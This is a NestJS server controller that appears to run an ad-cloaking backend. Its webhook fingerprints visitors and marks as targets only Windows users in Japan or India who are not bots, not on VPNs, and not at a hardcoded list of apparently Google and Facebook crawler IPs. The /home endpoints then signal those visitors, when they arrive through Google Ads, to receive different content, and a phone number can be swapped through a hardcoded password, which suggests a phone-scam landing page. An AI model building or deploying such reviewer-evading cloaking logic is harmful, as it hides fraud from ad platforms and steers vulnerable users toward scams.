import {
  Controller,
  Get,
  HttpCode,
  HttpStatus, Ip,
  Post,
  Query,
  Req,
  Res,
} from '@nestjs/common';
import { Response, Request } from 'express';
import { Cron } from '@nestjs/schedule';
import axios from 'axios';

@Controller()
export class AppController {
  constructor() {}

  private listUsers = [];
  private openUsersList = [];
  updateConst = false;
  updateConst2 = false;
  phoneNumber = '0101-201-335-4160';
  phoneNumber2 = '0101-201-335-4160';
  @Get()
  getHello(): string {
    console.log('hello');
    return 'Hello World!';
  }

  async getIpInfo(ip: string) {
    try {
      const response = await axios.get(`http://ip-api.com/json/${ip}`);
      return response.data;
    } catch (error) {
      return { error: 'Unable to fetch IP info' };
    }
  }

  @Get('ip')
  async getUserIp(@Ip() ip: string) {
    const x = await this.getIpInfo(ip);
    // "countryCode": "JP",
    return x.countryCode;
  }

  @Cron('30 * * * * *')
  continueRequest() {
    axios('https://react-back-qd49.onrender.com');
  }

  // @Get('listUsers')
  // getListUsers(@Res() res: Response) {
  //   res.send(this.listUsers);
  // }
  //
  // @Get('listUsers')
  // getOpenUsersList(@Res() res: Response) {
  //   res.send(this.openUsersList);
  // }

  @Get('/getConst')
  getConst(@Res() res: Response) {
    res.status(200).send(this.updateConst);
  }

  @Get('/getConst2')
  getConst2(@Res() res: Response) {
    res.status(200).send(this.updateConst2);
  }

  @Get('/getPhoneNumber')
  getPhoneNumber(@Res() res: Response) {
    res.status(200).send(this.phoneNumber);
  }

  @Get('/getPhoneNumber2')
  getPhoneNumber2(@Res() res: Response) {
    res.status(200).send(this.phoneNumber2);
  }

  @Post('/contact')
  getContact(@Req() req: Request, @Res() res: Response) {
    console.log('Request body:', req.body);
    res.status(200).send('OK');
  }

  @Post('/updateConst')
  updateConstFun(@Res() res: Response, @Req() req: Request) {
    if (req.body['password'] === 'Jonny') {
      this.updateConst = req.body['value'];
    }
    res.send(this.updateConst);
  }

  @Post('/updateConst2')
  updateConstFun2(@Res() res: Response, @Req() req: Request) {
    if (req.body['password'] === 'Jonny') {
      this.updateConst2 = req.body['value'];
    }
    res.send(this.updateConst2);
  }

  @Post('/updatePhoneNumber')
  updatePhoneNumberFun(@Res() res: Response, @Req() req: Request) {
    if (req.body['password'] === 'Jonny') {
      this.phoneNumber = req.body['value'];
    }
    res.send(this.phoneNumber);
  }

  @Post('/updatePhoneNumber2')
  updatePhoneNumberFun2(@Res() res: Response, @Req() req: Request) {
    if (req.body['password'] === 'Jonny') {
      this.phoneNumber2 = req.body['value'];
    }
    res.send(this.phoneNumber2);
  }

  @Get('requestedUser')
  requestedUser(
    @Query('visitorId') visitorId: string,
    ) {
    this.openUsersList.push(visitorId);
  }

  @Get('/home')
  async timezone(
    @Res() res: Response,
    @Query('visitorId') visitorId: string,
    @Query('gclid') gclid: string,
  ) {
    console.log('prm', visitorId, this.listUsers.includes(visitorId), gclid);
    if (this.listUsers.includes(visitorId) && this.updateConst && gclid !== 'undefined' && !this.openUsersList.includes(visitorId)) {
      console.log('if');
      res.send('jp-ja');
    } else {
      console.log('else');
      // res.send('jp-ja');
      res.status(200).send('null');
    }
  }

  @Get('/home2')
  async timezone2(
    @Res() res: Response,
    @Query('visitorId') visitorId: string,
    @Query('gclid') gclid: string,
  ) {
    console.log('prm', visitorId, this.listUsers.includes(visitorId), gclid);
    if (/*this.listUsers.includes(visitorId) &&*/ this.updateConst2 && gclid !== 'undefined'/* && !this.openUsersList.includes(visitorId)*/) {
      console.log('if');
      res.send('jp-ja');
    } else {
      console.log('else');
      // res.send('jp-ja');
      res.status(200).send('null');
    }
  }

  @Post('webhook/fingerprint')
  @HttpCode(HttpStatus.OK)
  async handleWebhook(@Req() req: Request, @Res() res: Response) {
    try {
      const parsedBody: any = req.body;

      const window = parsedBody?.browser_details?.os; // Windows
      const bot = parsedBody?.bot; // notDetected
      const timezone = parsedBody?.ip_info?.v4?.geolocation?.timezone; // Asia/Tokyo
      const vpn = parsedBody?.vpn; // false
      const location = parsedBody?.ip_info?.v4?.geolocation?.country_name; // Japan
      const ip = parsedBody?.ip_info?.v4?.address;
      console.log(window, timezone, vpn, location, ip);

      const blockedIPs = [
        '10.9.203.10',
        '74.125.146.69',
        '209.85.245.105',
        '142.250.214.149',
        '142.250.199.110',
        '173.252.95.10',
        '69.171.234.112',
        '66.220.149.32',
        '69.171.249.113',
        '69.171.249.5',
        '173.252.107.6',
        '173.252.107.7',
        '173.252.107.115',
        '173.252.127.0',
        '173.252.83.4',
        '173.252.83.116',
        '69.171.231.113',
        '173.252.79.112',
        '31.13.103.10',
        '31.13.103.116',
        '31.13.115.7',
        '31.13.115.112',
        '31.13.127.113',
        '31.13.127.23',
        '45.76.201.219',
        '74.125.151.97',
        '35.194.72.7',
        '205.169.39.210',
        '40.77.179.4',
        '35.167.188.85',
      ];
      if (
        (
          (location === 'Japan' && timezone === 'Asia/Tokyo') ||
          (location === 'India' && timezone === 'Asia/Kolkata') ||
          (location === 'India' && timezone === 'Asia/Calcutta')
        ) &&
        vpn === false &&
        bot === 'not_detected' &&
        window === 'Windows' &&
        !blockedIPs.includes(ip)
      ) {
        console.log('do what you want');
        this.listUsers.push(parsedBody.visitorId);
      }
      return res.status(200).json({ message: 'Webhook received.' });
    } catch (error) {
      console.error('Webhook Error:', error);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  }
}
